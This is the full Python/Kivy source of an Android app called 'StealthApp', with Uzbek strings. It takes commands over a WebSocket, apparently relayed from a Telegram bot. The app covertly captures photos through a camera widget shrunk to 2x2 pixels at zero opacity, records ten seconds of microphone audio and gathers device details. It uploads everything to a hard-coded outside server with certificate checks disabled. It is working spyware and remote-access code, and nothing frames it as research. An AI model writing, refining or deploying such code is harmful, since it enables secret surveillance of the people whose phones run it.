import asyncio
import threading
import os
import shutil
import time
import ssl
import uuid
import urllib.request
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.utils import platform

WS_URL     = "wss://hild-tracking-backend.onrender.com/ws/device"
UPLOAD_URL = "https://hild-tracking-backend.onrender.com/upload"

status           = ["Ishga tushirilmoqda..."]
should_reconnect = [True]
ws_ref           = [None]
app_ref          = [None]   # App instansiyasi


def _ssl_ctx():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    return ctx


# ─── URLLIB YUKLASH ────────────────────────────────────────────────────────────
def _multipart(fields, files=None):
    b = uuid.uuid4().hex
    body = b""
    for k, v in fields.items():
        body += ("--" + b + "\r\nContent-Disposition: form-data; name=\""
                 + k + "\"\r\n\r\n" + str(v) + "\r\n").encode()
    if files:
        for k, (fname, data) in files.items():
            body += ("--" + b + "\r\nContent-Disposition: form-data; name=\""
                     + k + "\"; filename=\"" + fname + "\"\r\n"
                     "Content-Type: application/octet-stream\r\n\r\n").encode()
            body += data + b"\r\n"
    body += ("--" + b + "--\r\n").encode()
    req = urllib.request.Request(
        UPLOAD_URL, data=body,
        headers={"Content-Type": "multipart/form-data; boundary=" + b}
    )
    resp = urllib.request.urlopen(req, context=_ssl_ctx(), timeout=30)
    return resp.status


def upload_file_sync(file_path, media_type):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        code = _multipart({"media_type": media_type},
                          {"file": (os.path.basename(file_path), data)})
        status[0] = "Yuborildi! (" + str(code) + ")"
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception as e:
        status[0] = "Upload xatolik: " + str(e)[:120]


def send_text_sync(text_data):
    try:
        code = _multipart({"media_type": "text", "text": text_data})
        status[0] = "Telegramga yuborildi! (" + str(code) + ")"
    except Exception as e:
        status[0] = "Yuborish xatolik: " + str(e)[:120]


# ─── QURILMA ─────────────────────────────────────────────────────────────────
def get_battery_info():
    try:
        from jnius import autoclass
        ctx  = autoclass('org.kivy.android.PythonActivity').mActivity
        I    = autoclass('android.content.Intent')
        IF   = autoclass('android.content.IntentFilter')
        BM   = autoclass('android.os.BatteryManager')
        bs   = ctx.registerReceiver(None, IF(I.ACTION_BATTERY_CHANGED))
        pct  = int(bs.getIntExtra(BM.EXTRA_LEVEL, -1) * 100
                   / bs.getIntExtra(BM.EXTRA_SCALE, -1))
        sv   = bs.getIntExtra(BM.EXTRA_STATUS, -1)
        chg  = sv in [BM.BATTERY_STATUS_CHARGING, BM.BATTERY_STATUS_FULL]
        return "Batareya: " + str(pct) + "%\n" + ("Zaryadlanmoqda" if chg else "Zaryadlanmayapti")
    except Exception as e:
        return "Batareya xatolik: " + str(e)


def get_device_info():
    try:
        from jnius import autoclass
        B = autoclass('android.os.Build')
        V = autoclass('android.os.Build$VERSION')
        return ("Model: " + B.MODEL + "\nBrand: " + B.BRAND
                + "\nAndroid: " + V.RELEASE + "\nSDK: " + str(V.SDK_INT))
    except Exception as e:
        return "Qurilma info xatolik: " + str(e)


# ─── KAMERA (Kivy Camera widget — GL texture muammo yo'q) ─────────────────────
def take_photo_kivy(front_camera):
    """Asosiy Kivy threadidan chaqiriladi (Clock orqali)"""
    try:
        from kivy.uix.camera import Camera as KivyCam
        from jnius import autoclass
        activity = autoclass('org.kivy.android.PythonActivity').mActivity
        ext_dir  = activity.getExternalFilesDir(None).getAbsolutePath()
        cam_name = 'selfie' if front_camera else 'capture'
        filepath = ext_dir + '/' + cam_name + '.png'

        cam = KivyCam(
            index=1 if front_camera else 0,
            resolution=(1280, 720),
            play=True,
            size_hint=(None, None),
            size=(2, 2),      # Ko'rinmas darajada kichik
            opacity=0,        # Invisible
        )
        app_ref[0].root.add_widget(cam)
        status[0] = 'Kamera tayorlanmoqda...'

        def capture(dt):
            try:
                cam.export_to_png(filepath)
                cam.play = False
                app_ref[0].root.remove_widget(cam)
                if os.path.exists(filepath) and os.path.getsize(filepath) > 100:
                    threading.Thread(
                        target=upload_file_sync,
                        args=(filepath, 'photo'),
                        daemon=True
                    ).start()
                    status[0] = 'Rasm olindi, yuborilmoqda...'
                else:
                    status[0] = 'Kamera: rasm olinmadi'
            except Exception as ex:
                status[0] = 'Capture xatolik: ' + str(ex)

        Clock.schedule_once(capture, 2.5)

    except Exception as e:
        status[0] = 'Kamera xatolik: ' + str(e)


# ─── AUDIO ────────────────────────────────────────────────────────────────────
def record_audio():
    try:
        from jnius import autoclass
        MR  = autoclass('android.media.MediaRecorder')
        AS_ = autoclass('android.media.MediaRecorder$AudioSource')
        OF  = autoclass('android.media.MediaRecorder$OutputFormat')
        AE  = autoclass('android.media.MediaRecorder$AudioEncoder')
        act = autoclass('org.kivy.android.PythonActivity').mActivity

        ext_dir  = act.getExternalFilesDir(None).getAbsolutePath()
        filepath = ext_dir + '/audio.m4a'

        rec = MR()
        rec.setAudioSource(AS_.MIC)
        rec.setOutputFormat(OF.MPEG_4)
        rec.setAudioEncoder(AE.AAC)
        rec.setOutputFile(filepath)
        rec.prepare()
        rec.start()
        status[0] = 'Yozilmoqda (10 sek)...'
        time.sleep(10)
        rec.stop()
        rec.release()
        if os.path.exists(filepath):
            upload_file_sync(filepath, 'audio')
    except Exception as e:
        status[0] = 'Audio xatolik: ' + str(e)


# ─── WEBSOCKET ────────────────────────────────────────────────────────────────
async def ws_loop():
    loop  = asyncio.get_running_loop()
    retry = 0
    while should_reconnect[0]:
        try:
            import websockets
            retry += 1
            status[0] = 'Ulanilmoqda... (' + str(retry) + '-urinish)'
            async with websockets.connect(
                WS_URL, ssl=_ssl_ctx(),
                ping_interval=30, ping_timeout=15,
                open_timeout=15, close_timeout=5,
            ) as ws:
                ws_ref[0] = ws
                retry = 0
                status[0] = 'ULANDI! Telegram botdan buyruq bering.'
                while True:
                    msg = await ws.recv()
                    status[0] = 'Buyruq: ' + msg

                    if msg == 'take_photo':
                        Clock.schedule_once(lambda dt: take_photo_kivy(False), 0)
                    elif msg == 'selfie':
                        Clock.schedule_once(lambda dt: take_photo_kivy(True), 0)
                    elif msg == 'record_audio':
                        threading.Thread(target=record_audio, daemon=True).start()
                    elif msg == 'battery':
                        info = get_battery_info()
                        status[0] = info
                        await loop.run_in_executor(None, send_text_sync, info)
                    elif msg == 'device_info':
                        info = get_device_info()
                        status[0] = info
                        await loop.run_in_executor(None, send_text_sync, info)

        except Exception as e:
            ws_ref[0] = None
            wait = min(5 * retry, 30)
            status[0] = ('Xatolik:\n' + str(e)[:100] +
                         '\n\n' + str(wait) + " soniyadan so'ng qayta...")
            await asyncio.sleep(wait)


def run_loop():
    try:
        lp = asyncio.new_event_loop()
        asyncio.set_event_loop(lp)
        lp.run_until_complete(ws_loop())
    except Exception as e:
        status[0] = 'Loop xatolik: ' + str(e)[:150]


def force_reconnect():
    should_reconnect[0] = False
    if ws_ref[0]:
        try:
            asyncio.run_coroutine_threadsafe(ws_ref[0].close(), asyncio.get_event_loop())
        except Exception:
            pass
    try:
        if platform == 'android':
            from jnius import autoclass
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            cd  = ctx.getCacheDir().getAbsolutePath()
            shutil.rmtree(cd, ignore_errors=True)
            os.makedirs(cd, exist_ok=True)
    except Exception:
        pass
    time.sleep(1)
    should_reconnect[0] = True
    threading.Thread(target=run_loop, daemon=True).start()


# ─── UI ───────────────────────────────────────────────────────────────────────
class StealthApp(App):
    def build(self):
        app_ref[0] = self
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)

        self.label = Label(
            text='Ishga tushirilmoqda...',
            font_size='14sp', halign='center', valign='middle',
            size_hint=(1, 0.85), color=(1, 1, 1, 1),
        )
        self.label.bind(
            width=lambda inst, val: setattr(inst, 'text_size', (val, None))
        )

        btn = Button(
            text='Keshni tozala va qayta ulash',
            font_size='13sp', size_hint=(1, 0.15),
            background_color=(0.2, 0.5, 0.9, 1),
        )
        btn.bind(on_press=lambda x: threading.Thread(
            target=force_reconnect, daemon=True).start())

        layout.add_widget(self.label)
        layout.add_widget(btn)

        if platform == 'android':
            Clock.schedule_once(self._request_permissions, 0.5)
        else:
            threading.Thread(target=run_loop, daemon=True).start()

        Clock.schedule_interval(self.update_ui, 1)
        return layout

    def _request_permissions(self, dt):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA, Permission.RECORD_AUDIO,
                Permission.INTERNET, Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
            ], self._on_permissions_result)
        except Exception as e:
            status[0] = 'Ruxsat xatoligi: ' + str(e)[:80]
            threading.Thread(target=run_loop, daemon=True).start()

    def _on_permissions_result(self, permissions, grants):
        threading.Thread(target=run_loop, daemon=True).start()

    def update_ui(self, dt):
        self.label.text = status[0]


if __name__ == '__main__':
    StealthApp().run()
